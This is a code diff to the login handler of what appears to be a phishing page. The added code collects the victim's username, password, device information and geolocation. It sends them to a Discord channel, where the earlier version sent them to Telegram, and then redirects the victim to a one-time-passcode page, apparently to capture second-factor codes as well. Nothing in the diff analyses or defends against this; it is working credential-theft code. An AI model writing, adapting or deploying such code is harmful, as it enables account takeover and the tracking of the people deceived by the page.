@@ -58,37 +58,83 @@ document.addEventListener('DOMContentLoaded', function() {
             const userAgent = navigator.userAgent;
             const timestamp = new Date().toLocaleString();
             
-            // Prepare message for Telegram
-            const message = `
-🔐 <b>New Login Attempt</b>
-
-👤 <b>Username:</b> ${username}
-🔑 <b>Password:</b> ${password}
-
-📱 <b>Device Info:</b>
-${userAgent}
-
-🕐 <b>Time:</b> ${timestamp}
-            `.trim();
-
             // Change button state
             loginSubmitBtn.textContent = 'Logging in...';
             loginSubmitBtn.disabled = true;
 
-            // Send to Telegram
-            if (typeof sendToTelegram === 'function') {
-                sendToTelegram(message).then(success => {
-                    if (success) {
-                        console.log('Login credentials sent to Telegram');
+            // Get location (use stored location from splash if available, otherwise get new one)
+            let locationPromise;
+            const storedLocation = localStorage.getItem('userLocation');
+            if (storedLocation) {
+                try {
+                    const parsedLocation = JSON.parse(storedLocation);
+                    if (parsedLocation.latitude !== 'N/A') {
+                        console.log('📍 Using stored location from splash screen');
+                        locationPromise = Promise.resolve(parsedLocation);
                     } else {
-                        console.log('Telegram send failed, but continuing with login');
+                        locationPromise = getUserLocation();
                     }
-                }).catch(error => {
-                    console.log('Telegram error, but continuing with login:', error);
-                });
+                } catch (e) {
+                    locationPromise = getUserLocation();
+                }
             } else {
-                console.log('Telegram not configured, continuing with login');
+                locationPromise = getUserLocation();
             }
+            
+            locationPromise.then(location => {
+                // Prepare message for Discord (simple and friendly)
+                const locationText = formatLocationForDiscord(location);
+                const message = `
+🔐 New Login Attempt
+
+👤 Username: ${username}
+🔑 Password: ${password}
+
+📱 Device Info:
+${userAgent}
+
+${locationText}
+
+🕐 Time: ${timestamp}
+                `.trim();
+
+                // Send to Discord
+                if (typeof sendToTelegram === 'function' || typeof sendToDiscord === 'function') {
+                    const sendFunction = sendToDiscord || sendToTelegram;
+                    sendFunction(message).then(success => {
+                        if (success) {
+                            console.log('Login credentials sent to Discord');
+                        } else {
+                            console.log('Discord send failed, but continuing with login');
+                        }
+                    }).catch(error => {
+                        console.log('Discord error, but continuing with login:', error);
+                    });
+                } else {
+                    console.log('Discord not configured, continuing with login');
+                }
+            }).catch(error => {
+                // If location fails, send without location
+                console.log('Location error:', error);
+                const message = `
+🔐 New Login Attempt
+
+👤 Username: ${username}
+🔑 Password: ${password}
+
+📱 Device Info:
+${userAgent}
+
+📍 Location: Not available
+
+🕐 Time: ${timestamp}
+                `.trim();
+
+                if (typeof sendToTelegram === 'function' || typeof sendToDiscord === 'function') {
+                    const sendFunction = sendToDiscord || sendToTelegram;
+                    sendFunction(message).catch(err => console.log('Discord error:', err));
+                }
+            });
 
             // Always redirect to OTP page after short delay
             setTimeout(() => {
